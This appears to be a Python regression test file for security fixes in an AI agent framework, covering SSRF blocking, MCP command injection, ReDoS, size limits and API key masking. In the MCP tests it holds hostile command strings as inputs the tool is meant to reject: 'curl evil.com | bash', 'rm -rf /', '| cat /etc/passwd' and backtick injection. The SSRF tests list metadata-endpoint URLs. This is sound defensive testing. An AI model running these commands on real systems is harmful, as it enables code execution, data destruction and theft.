"""
Security Audit Regression Tests
================================
Tests for all 10 security vulnerabilities found and fixed:

SEC-CRITICAL-1: SSRF in web_fetch.py
SEC-CRITICAL-2: Subagent recursion bomb in task_tool.py
SEC-CRITICAL-3: MCP command injection in mcp_client.py
SEC-HIGH-1: No concurrency limit in tool_registry.py execute_parallel
SEC-HIGH-2: Grep regex ReDoS in grep_tool.py
SEC-HIGH-3: Write tool deep directory creation
SEC-HIGH-4: Skill registry SKILL.md size limit
SEC-MEDIUM-1: API key exposure in provider repr
SEC-MEDIUM-2: Notebook edit no size limit
SEC-MEDIUM-3: Scheduler cron field validation
"""

import asyncio
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))


# ── Helpers ──────────────────────────────────────────────────────────
def run(coro):
    """Run an async coroutine in a new event loop."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ═══════════════════════════════════════════════════════════════════════
# SEC-CRITICAL-1: SSRF Protection in WebFetch
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_CRITICAL1_SSRF(unittest.TestCase):
    """WebFetch must block requests to private/internal network addresses."""

    def setUp(self):
        from cowork_agent.tools.web_fetch import WebFetchTool
        self.tool = WebFetchTool()

    def test_blocks_localhost(self):
        result = run(self.tool.execute(url="http://localhost:8080/admin", prompt="test"))
        self.assertFalse(result.success)
        self.assertIn("private/internal", result.error)

    def test_blocks_127_0_0_1(self):
        result = run(self.tool.execute(url="http://127.0.0.1/secret", prompt="test"))
        self.assertFalse(result.success)
        self.assertIn("private/internal", result.error)

    def test_blocks_metadata_endpoint(self):
        """AWS/GCP/Azure metadata endpoint must be blocked."""
        result = run(self.tool.execute(url="http://169.254.169.254/latest/meta-data/", prompt="test"))
        self.assertFalse(result.success)

    def test_blocks_private_10_x(self):
        result = run(self.tool.execute(url="http://10.0.0.1:9200/", prompt="test"))
        self.assertFalse(result.success)

    def test_blocks_private_192_168(self):
        result = run(self.tool.execute(url="http://192.168.1.1/router", prompt="test"))
        self.assertFalse(result.success)

    def test_blocks_private_172_16(self):
        result = run(self.tool.execute(url="http://172.16.0.1/internal", prompt="test"))
        self.assertFalse(result.success)

    def test_blocks_file_scheme(self):
        result = run(self.tool.execute(url="file:///etc/passwd", prompt="test"))
        self.assertFalse(result.success)

    def test_blocks_zero_address(self):
        result = run(self.tool.execute(url="http://0.0.0.0:80/", prompt="test"))
        self.assertFalse(result.success)

    def test_allows_public_urls(self):
        """Public URLs should not be blocked by SSRF check (may fail due to network, but not SSRF)."""
        # _is_ssrf_target should return False for public URLs
        self.assertFalse(self.tool._is_ssrf_target("https://www.example.com/page"))
        self.assertFalse(self.tool._is_ssrf_target("https://api.github.com/repos"))

    def test_blocks_empty_host(self):
        """Unparseable URLs should be blocked."""
        self.assertTrue(self.tool._is_ssrf_target("not-a-url"))


# ═══════════════════════════════════════════════════════════════════════
# SEC-CRITICAL-2: Subagent Recursion Depth Limit
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_CRITICAL2_RecursionBomb(unittest.TestCase):
    """TaskTool must enforce a maximum nesting depth."""

    def setUp(self):
        from cowork_agent.tools.task_tool import TaskTool, _current_depth
        import cowork_agent.tools.task_tool as tt_module
        self.tt_module = tt_module

        # Reset depth
        tt_module._current_depth = 0

        # Create mock agent factory
        mock_agent = MagicMock()
        mock_agent.run = AsyncMock(return_value="done")
        self.tool = TaskTool(agent_factory=lambda: mock_agent)

    def tearDown(self):
        self.tt_module._current_depth = 0

    def test_max_depth_enforced(self):
        """At MAX_DEPTH, new subagents should be rejected."""
        self.tt_module._current_depth = self.tool.MAX_DEPTH
        result = run(self.tool.execute(
            description="test", prompt="do something", tool_id="t1"
        ))
        self.assertFalse(result.success)
        self.assertIn("nesting depth", result.error)

    def test_depth_increments_and_decrements(self):
        """Depth should be properly tracked."""
        initial = self.tt_module._current_depth
        result = run(self.tool.execute(
            description="test", prompt="do something", tool_id="t1"
        ))
        # After execution, depth should be back to initial
        self.assertEqual(self.tt_module._current_depth, initial)

    def test_depth_decrements_on_error(self):
        """Depth must decrement even if subagent raises."""
        from cowork_agent.tools.task_tool import TaskTool

        mock_agent = MagicMock()
        mock_agent.run = AsyncMock(side_effect=RuntimeError("boom"))
        tool = TaskTool(agent_factory=lambda: mock_agent)

        initial = self.tt_module._current_depth
        result = run(tool.execute(description="test", prompt="fail", tool_id="t1"))
        # Depth should still be back to initial
        self.assertEqual(self.tt_module._current_depth, initial)
        self.assertFalse(result.success)

    def test_allows_below_max_depth(self):
        """Below MAX_DEPTH, subagents should work normally."""
        self.tt_module._current_depth = self.tool.MAX_DEPTH - 1
        result = run(self.tool.execute(
            description="test", prompt="do something", tool_id="t1"
        ))
        self.assertTrue(result.success)


# ═══════════════════════════════════════════════════════════════════════
# SEC-CRITICAL-3: MCP Command Injection Prevention
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_CRITICAL3_MCPCommandInjection(unittest.TestCase):
    """MCP client must validate commands and args."""

    def setUp(self):
        from cowork_agent.core.mcp_client import MCPClient, MCPServerConfig
        self.client = MCPClient()
        self.MCPServerConfig = MCPServerConfig

    def test_blocks_arbitrary_command(self):
        """Non-allowlisted commands must be rejected."""
        config = self.MCPServerConfig(name="evil", command="/bin/bash", args=["-c", "rm -rf /"])
        self.client.add_server(config)
        result = run(self.client._start_stdio_server("evil", config))
        self.assertFalse(result)

    def test_blocks_shell_metachar_in_args(self):
        """Args with shell metacharacters must be rejected."""
        config = self.MCPServerConfig(
            name="evil2", command="npx",
            args=["-y", "package; curl evil.com | bash"]
        )
        self.client.add_server(config)
        result = run(self.client._start_stdio_server("evil2", config))
        self.assertFalse(result)

    def test_blocks_pipe_in_args(self):
        config = self.MCPServerConfig(
            name="evil3", command="node",
            args=["server.js", "| cat /etc/passwd"]
        )
        self.client.add_server(config)
        result = run(self.client._start_stdio_server("evil3", config))
        self.assertFalse(result)

    def test_allows_safe_commands(self):
        """Allowlisted commands should pass validation (may fail for other reasons)."""
        for cmd in ["npx", "node", "python", "python3", "uvx", "deno"]:
            config = self.MCPServerConfig(name=f"safe-{cmd}", command=cmd, args=["--help"])
            # Will fail because the command doesn't speak MCP, but NOT because of validation
            # Just check the command validation doesn't block it
            import os
            command_base = os.path.basename(config.command)
            self.assertIn(command_base, self.client.ALLOWED_MCP_COMMANDS)

    def test_blocks_backtick_in_args(self):
        config = self.MCPServerConfig(
            name="evil4", command="npx",
            args=["`whoami`"]
        )
        self.client.add_server(config)
        result = run(self.client._start_stdio_server("evil4", config))
        self.assertFalse(result)


# ═══════════════════════════════════════════════════════════════════════
# SEC-HIGH-1: Concurrency Cap in execute_parallel
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_HIGH1_ConcurrencyCap(unittest.TestCase):
    """Tool registry must cap parallel execution."""

    def test_max_parallel_attribute(self):
        from cowork_agent.core.tool_registry import ToolRegistry
        registry = ToolRegistry()
        self.assertTrue(hasattr(registry, 'MAX_PARALLEL'))
        self.assertGreater(registry.MAX_PARALLEL, 0)
        self.assertLessEqual(registry.MAX_PARALLEL, 20)  # Reasonable cap

    def test_parallel_execution_with_many_calls(self):
        """Many parallel calls should still work (semaphore batching)."""
        from cowork_agent.core.tool_registry import ToolRegistry
        from cowork_agent.core.models import ToolCall, ToolResult
        from cowork_agent.tools.base import BaseTool

        class DummyTool(BaseTool):
            name = "dummy"
            description = "test"
            input_schema = {"type": "object", "properties": {}}
            async def execute(self, tool_id="", **kwargs):
                return self._success("ok", tool_id)

        registry = ToolRegistry()
        registry.register(DummyTool())

        # Create 25 calls (more than MAX_PARALLEL)
        calls = [
            ToolCall(name="dummy", tool_id=f"t{i}", input={})
            for i in range(25)
        ]
        results = run(registry.execute_parallel(calls))
        self.assertEqual(len(results), 25)
        for r in results:
            self.assertTrue(r.success)


# ═══════════════════════════════════════════════════════════════════════
# SEC-HIGH-2: Grep ReDoS Prevention
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_HIGH2_GrepReDoS(unittest.TestCase):
    """Grep must reject overly long patterns and invalid regex."""

    def setUp(self):
        from cowork_agent.tools.grep_tool import GrepTool
        self.tool = GrepTool(default_dir=tempfile.mkdtemp())

    def test_rejects_long_pattern(self):
        """Patterns over MAX_PATTERN_LENGTH should be rejected."""
        long_pattern = "a" * (self.tool.MAX_PATTERN_LENGTH + 1)
        result = run(self.tool.execute(pattern=long_pattern, tool_id="t1"))
        self.assertFalse(result.success)
        self.assertIn("too long", result.error)

    def test_rejects_invalid_regex(self):
        """Invalid regex should be caught early."""
        result = run(self.tool.execute(pattern="[invalid(", tool_id="t1"))
        self.assertFalse(result.success)
        self.assertIn("Invalid regex", result.error)

    def test_allows_normal_patterns(self):
        """Normal patterns should work fine."""
        result = run(self.tool.execute(pattern="hello.*world", tool_id="t1"))
        # Should succeed (no matches in empty dir, but no error)
        self.assertTrue(result.success)


# ═══════════════════════════════════════════════════════════════════════
# SEC-HIGH-3: Write Tool Path Depth Limit
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_HIGH3_WritePathDepth(unittest.TestCase):
    """Write tool must reject excessively deep paths."""

    def setUp(self):
        from cowork_agent.tools.write import WriteTool
        self.tool = WriteTool()

    def test_rejects_deep_path(self):
        """Paths deeper than MAX_DIR_DEPTH should be rejected."""
        deep_path = "/tmp/" + "/".join([f"d{i}" for i in range(20)]) + "/file.txt"
        result = run(self.tool.execute(file_path=deep_path, content="test", tool_id="t1"))
        self.assertFalse(result.success)
        self.assertIn("too deep", result.error.lower())

    def test_allows_reasonable_depth(self):
        """Reasonable depth paths should work."""
        with tempfile.TemporaryDirectory() as td:
            path = os.path.join(td, "a", "b", "file.txt")
            result = run(self.tool.execute(file_path=path, content="hello", tool_id="t1"))
            self.assertTrue(result.success)
            # Clean up
            os.remove(path)

    def test_max_dir_depth_attribute(self):
        self.assertTrue(hasattr(self.tool, 'MAX_DIR_DEPTH'))
        self.assertGreater(self.tool.MAX_DIR_DEPTH, 5)  # Reasonable minimum


# ═══════════════════════════════════════════════════════════════════════
# SEC-HIGH-4: Skill Registry Size Limit
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_HIGH4_SkillSizeLimit(unittest.TestCase):
    """Skill registry must reject oversized SKILL.md files."""

    def test_rejects_oversized_skill(self):
        from cowork_agent.core.skill_registry import SkillRegistry

        with tempfile.TemporaryDirectory() as td:
            skill_dir = os.path.join(td, "bigskill")
            os.makedirs(skill_dir)
            skill_md = os.path.join(skill_dir, "SKILL.md")

            # Write a file larger than MAX_SKILL_SIZE
            registry = SkillRegistry()
            with open(skill_md, "w") as f:
                f.write("x" * (registry.MAX_SKILL_SIZE + 1))

            result = registry._load_skill("bigskill", skill_dir, skill_md)
            self.assertIsNone(result)

    def test_allows_normal_skill(self):
        from cowork_agent.core.skill_registry import SkillRegistry

        with tempfile.TemporaryDirectory() as td:
            skill_dir = os.path.join(td, "normalskill")
            os.makedirs(skill_dir)
            skill_md = os.path.join(skill_dir, "SKILL.md")
            with open(skill_md, "w") as f:
                f.write("# Normal Skill\nThis is a normal skill file.")

            registry = SkillRegistry()
            result = registry._load_skill("normalskill", skill_dir, skill_md)
            self.assertIsNotNone(result)
            self.assertEqual(result.name, "normalskill")


# ═══════════════════════════════════════════════════════════════════════
# SEC-MEDIUM-1: API Key Masking in repr
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_MEDIUM1_APIKeyMasking(unittest.TestCase):
    """Provider repr must mask API keys."""

    def test_repr_masks_key(self):
        from cowork_agent.core.providers.base import BaseLLMProvider

        class DummyProvider(BaseLLMProvider):
            async def send_message(self, messages, tools, system_prompt):
                pass
            async def health_check(self):
                return {}

        provider = DummyProvider(model="test", api_key="sk-supersecretkey12345")
        repr_str = repr(provider)
        self.assertNotIn("supersecret", repr_str)
        self.assertIn("***", repr_str)
        # Should show last 4 chars
        self.assertIn("2345", repr_str)

    def test_api_key_property(self):
        """API key should be accessible via property."""
        from cowork_agent.core.providers.base import BaseLLMProvider

        class DummyProvider(BaseLLMProvider):
            async def send_message(self, messages, tools, system_prompt):
                pass
            async def health_check(self):
                return {}

        provider = DummyProvider(model="test", api_key="my-secret-key")
        self.assertEqual(provider.api_key, "my-secret-key")

    def test_repr_handles_short_key(self):
        from cowork_agent.core.providers.base import BaseLLMProvider

        class DummyProvider(BaseLLMProvider):
            async def send_message(self, messages, tools, system_prompt):
                pass
            async def health_check(self):
                return {}

        provider = DummyProvider(model="test", api_key="ab")
        repr_str = repr(provider)
        self.assertIn("***", repr_str)
        self.assertNotIn("ab", repr_str)

    def test_repr_handles_none_key(self):
        from cowork_agent.core.providers.base import BaseLLMProvider

        class DummyProvider(BaseLLMProvider):
            async def send_message(self, messages, tools, system_prompt):
                pass
            async def health_check(self):
                return {}

        provider = DummyProvider(model="test", api_key=None)
        repr_str = repr(provider)
        self.assertIn("***", repr_str)


# ═══════════════════════════════════════════════════════════════════════
# SEC-MEDIUM-2: Notebook Edit File Size Limit
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_MEDIUM2_NotebookSizeLimit(unittest.TestCase):
    """NotebookEdit must reject oversized notebooks."""

    def test_rejects_oversized_notebook(self):
        from cowork_agent.tools.notebook_edit import NotebookEditTool
        tool = NotebookEditTool()

        with tempfile.NamedTemporaryFile(suffix=".ipynb", delete=False, mode="w") as f:
            # Write a notebook larger than 10MB
            big_content = {"cells": [{"cell_type": "code", "source": ["x" * 1000]} for _ in range(15000)]}
            json.dump(big_content, f)
            f.flush()
            path = f.name

        try:
            result = run(tool.execute(
                notebook_path=path,
                new_source="test",
                tool_id="t1",
            ))
            self.assertFalse(result.success)
            self.assertIn("too large", result.error.lower())
        finally:
            os.unlink(path)

    def test_allows_normal_notebook(self):
        from cowork_agent.tools.notebook_edit import NotebookEditTool
        tool = NotebookEditTool()

        with tempfile.NamedTemporaryFile(suffix=".ipynb", delete=False, mode="w") as f:
            nb = {
                "cells": [
                    {"cell_type": "code", "source": ["print('hello')"], "metadata": {}, "outputs": [], "execution_count": None}
                ],
                "metadata": {},
                "nbformat": 4,
                "nbformat_minor": 5,
            }
            json.dump(nb, f)
            f.flush()
            path = f.name

        try:
            result = run(tool.execute(
                notebook_path=path,
                new_source="print('world')",
                cell_number=0,
                tool_id="t1",
            ))
            self.assertTrue(result.success)
        finally:
            os.unlink(path)


# ═══════════════════════════════════════════════════════════════════════
# SEC-MEDIUM-3: Scheduler Cron Field Validation
# ═══════════════════════════════════════════════════════════════════════
class TestSEC_MEDIUM3_CronValidation(unittest.TestCase):
    """Cron field parser must validate range bounds."""

    def test_rejects_reversed_range(self):
        """start > end in range should not produce huge value list."""
        from cowork_agent.core.scheduler import _parse_cron_field
        # 5-2 would be a reversed range — should produce empty
        result = _parse_cron_field("5-2", 0, 6)
        self.assertEqual(result, [])

    def test_clamps_out_of_bounds(self):
        """Values outside min-max should be clamped or excluded."""
        from cowork_agent.core.scheduler import _parse_cron_field
        # Range 50-70 for a 0-59 minute field
        result = _parse_cron_field("50-70", 0, 59)
        # Should be clamped to 50-59
        self.assertTrue(all(0 <= v <= 59 for v in result))
        self.assertIn(50, result)
        self.assertNotIn(70, result)

    def test_rejects_single_out_of_bounds(self):
        """Single values outside bounds should be excluded."""
        from cowork_agent.core.scheduler import _parse_cron_field
        result = _parse_cron_field("99", 0, 59)
        self.assertEqual(result, [])

    def test_normal_range_works(self):
        from cowork_agent.core.scheduler import _parse_cron_field
        result = _parse_cron_field("1-5", 0, 6)
        self.assertEqual(result, [1, 2, 3, 4, 5])

    def test_comma_separated_values(self):
        from cowork_agent.core.scheduler import _parse_cron_field
        result = _parse_cron_field("1,3,5", 0, 6)
        self.assertEqual(result, [1, 3, 5])


# ═══════════════════════════════════════════════════════════════════════
# Integration Tests: Cross-component security scenarios
# ═══════════════════════════════════════════════════════════════════════
class TestSecurityIntegration(unittest.TestCase):
    """Cross-component security verification."""

    def test_ssrf_plus_retry_doesnt_bypass(self):
        """SSRF check should run before any retries."""
        from cowork_agent.tools.web_fetch import WebFetchTool
        tool = WebFetchTool()
        result = run(tool.execute(url="http://169.254.169.254/latest/", prompt="test"))
        self.assertFalse(result.success)
        self.assertIn("private/internal", result.error)

    def test_write_depth_plus_safety_checker(self):
        """Deep path + safety checker should both protect."""
        from cowork_agent.tools.write import WriteTool
        tool = WriteTool()
        # Very deep path
        deep_path = "/tmp/" + "/".join(["a"] * 25) + "/evil.txt"
        result = run(tool.execute(file_path=deep_path, content="x", tool_id="t1"))
        self.assertFalse(result.success)

    def test_provider_key_not_leaked_in_error(self):
        """Provider errors should not contain API keys."""
        from cowork_agent.core.providers.anthropic_provider import AnthropicProvider
        provider = AnthropicProvider(model="test", api_key="sk-ant-secret-key-12345")
        repr_str = repr(provider)
        self.assertNotIn("sk-ant-secret-key", repr_str)


if __name__ == "__main__":
    unittest.main(verbosity=2)
